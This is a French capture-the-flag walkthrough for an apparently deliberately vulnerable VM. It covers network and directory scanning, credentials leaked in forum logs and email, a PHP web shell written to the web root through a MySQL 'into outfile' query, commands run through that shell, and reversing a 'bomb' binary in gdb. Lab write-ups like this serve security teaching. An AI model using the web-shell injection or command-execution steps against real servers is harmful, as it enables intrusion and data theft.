@@ -1,0 +1,109 @@
+ifconfig
+
+nmap la plage ip de vmnet8 -p80 --open
+
+dirb https://ip big.txt
+
+on trouve /webmail /forum /phpmyadmin
+
+dans le forum il y a un "Probleme login"
+ce sont les logs dedans on trouve a un moment le mot de passe a la place du login
+
+!q\]Ej?*5K5cy*AJ
+
+On se connecte avec lmezard
+
+on a accès au mail qu'on rentre sur /webmail avec le même mdp
+
+Ici on tombe sur un mail avec les accès root sur la DB
+root/Fg-'kKXBj87E:aJ$
+
+de là on peu injecter un fichier php sur le server mais nous n'avons pas les droits a tout les endroits
+
+Après avoir tester plusieurs dossiers (tous indiquer dans le test de dirb)
+
+dans forum/templates_c nous avons les droits d'écriture
+
+SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php"
+
+/var/www est l'endroit ou se trouve les sites web.
+
+en accédant a l'ip /forum/templates_c/cmd.php?cmd=ls
+nous pouvons éxecuter toute les commandes systèmes
+en faisant un ls /home nous trouvons un dossier LOOKATME avec un fichier password
+/forum/templates_c/cmd.php?cmd=ls /home/
+/forum/templates_c/cmd.php?cmd=ls /home/LOOKATME
+/forum/templates_c/cmd.php?cmd=cat /home/LOOKATME/password
+
+nous avons ces informations :
+lmezard:G!@M6f4Eatau{sF"
+
+nous pouvons nous connecter a la vm avec ces identifiants nous trouvons ici un fichier fun
+
+celui ci contient un main avec la phrase :
+
+int main() { printf("M"); printf("Y"); printf(" "); printf("P"); printf("A"); printf("S"); printf("S"); printf("W"); printf("O"); printf("R"); printf("D"); printf(" "); printf("I"); printf("S"); printf(":"); printf(" "); printf("%c",getme1()); printf("%c",getme2()); printf("%c",getme3()); printf("%c",getme4()); printf("%c",getme5()); printf("%c",getme6()); printf("%c",getme7()); printf("%c",getme8()); printf("%c",getme9()); printf("%c",getme10()); printf("%c",getme11()); printf("%c",getme12()); printf("\n"); printf("Now SHA-256 it and submit"); }
+
+MY PASSWORD IS getme1(), getme2() [...], getme12() Now SHA-256 it and submit
+
+nous constatons rapidement que de 8 a 12 cela return une lettre a chaque fois
+getme8 = w, getme9 = n, getme10 = a, getme11 = g, getme12 = e
+wnage
+
+Pour les autres le résultat est découpé en plusieurs fichier, dans getme1() nous pouvons voir //FILE5ft_fun etc..
+si nous allons dans //FILE6ft_fun etc.. nous trouvons un return "I";
+getme1= I, getme2 = h, getme3= e, getme4 = a, getme5= r, getme6 = t, getme7 = p
+Iheartpwnage
+SHA-256 = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+nous pouvons donc accéder en ssh a laurie
+
+ici nous avons une bomb a désamorcer
+
+avec le hint P
+nous faisons un strings bomb | grep P
+Trois phrases ressortent
+après avoir tester la phrase 
+Public speaking is very easy.
+fonctionne
+
+pour la partie 2 nous avons " 2"
+en regardant les fonctions du binaire avec nm nous pouvons voir qu'il y a des fonctions pour chaque "phase"
+en plaçant un breakpoint sur phase_2 nous pouvons disassembler le code de la fonction pour y trouver
+
+nm bomb
+gdb bomb
+(gdb) break phase_2
+(gdb) run answer.txt
+1
+(gdb) disas
+
+ici nous pouvons voir la première comparaison est = a 1
+cmpl   $0x1,-0x18(%ebp)
+
+ici ce trouve la comparaison que nous devons trouver
+
+imul   -0x4(%esi,%ebx,4),%eax
+cmp    %eax,(%esi,%ebx,4)
+
+et il y a une boucle jsute ici
+
+cmp    $0x5,%ebx
+
+en avançant avec until jusqu'a la comparaison nous pouvons utiliser 
+(gdb)i r
+pour voir les valeurs attendus
+(gdb)until
+(gdb)i r
+etc.. pour voir les autres valeurs
+nous arrivons sur
+1 2 6 24
+nous constatons que le calcul est de la forme
+v[i] = i * v[i -1] + i * v[i - 2]
+ex : 3 * 6 + 3 * 2 = 18 + 6 = 24
+la suite est donc
+4 * 24 + 4 * 6 = 96 + 24 = 120
+5 * 120 + 5 * 24 = 600 + 120 = 720
+la suite de nombre est donc
+1 2 6 24 120 720
+
